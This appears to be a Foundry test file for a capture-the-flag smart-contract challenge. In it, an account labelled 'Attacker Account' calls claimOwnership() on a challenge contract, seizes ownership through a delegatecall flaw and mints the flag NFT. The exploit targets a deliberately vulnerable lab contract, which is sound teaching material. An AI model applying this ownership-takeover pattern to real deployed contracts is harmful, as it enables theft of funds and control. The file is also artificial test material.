//SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import {Test, console} from "forge-std/Test.sol";
import {Challenge7} from "../../contracts/Challenge7.sol";
import {Challenge7Delegate} from "../../contracts/Challenge7Delegate.sol";
import {NFTFlagsMock} from "../mocks/NftFlagsMock.sol";

contract Challenge6Test is Test {

    Challenge7 challenge7Contract;
    Challenge7Delegate delegate;
    //Challenge6Solution solutionAddr;
    NFTFlagsMock nftFlagsMock;
    address user;
    address originOwner;
    function setUp() public {
        user = makeAddr("user");
        originOwner = makeAddr("originOwner");
        vm.deal(user, 1 ether);
        vm.startBroadcast(user);
            nftFlagsMock = new NFTFlagsMock(user);
            delegate = new Challenge7Delegate(originOwner);
            challenge7Contract = new Challenge7(address(nftFlagsMock), address(delegate), originOwner);
            //solutionAddr = new Challenge6Solution(address(challenge7Contract)/* , "BG CTF Challenge 6 Solution" */);
            nftFlagsMock.addAllowedMinter(address(challenge7Contract));
        vm.stopBroadcast();
                // Label addresses for clarity in logs
        vm.label(address(nftFlagsMock), "NFTContract");
        vm.label(address(delegate), "Challenge7Delegate");
        vm.label(address(challenge7Contract), "Challenge7");
        vm.label(user, "Attacker Account");
    }

    function testDelegateCallWorks() public {
        assertEq(challenge7Contract.owner(), originOwner);

        vm.startPrank(user);
        (bool success,) = address(challenge7Contract).call(abi.encodeWithSignature("claimOwnership()"));
        require(success, "Delegatecall failed!");

        assertEq(challenge7Contract.owner(), user);

        challenge7Contract.mintFlag();

        vm.stopPrank();
        assertEq(nftFlagsMock.hasMinted(user, 7), true);

    }

    

}